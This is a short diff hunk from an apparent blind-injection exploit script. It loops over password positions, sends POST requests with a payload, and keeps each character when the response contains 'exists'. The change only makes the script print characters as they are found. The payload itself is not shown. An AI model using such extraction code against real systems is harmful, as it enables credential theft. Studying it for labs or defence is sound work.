@@ -31,7 +31,7 @@ for c in range(1,length+1): #loop for each character in the password
         
         r = requests.post(url+payload, headers=headers)
         if 'exists' in r.text:
-            password += chr(i)
+            print(chr(i), end='', flush=True)
             break
 
-print(password)
+print()
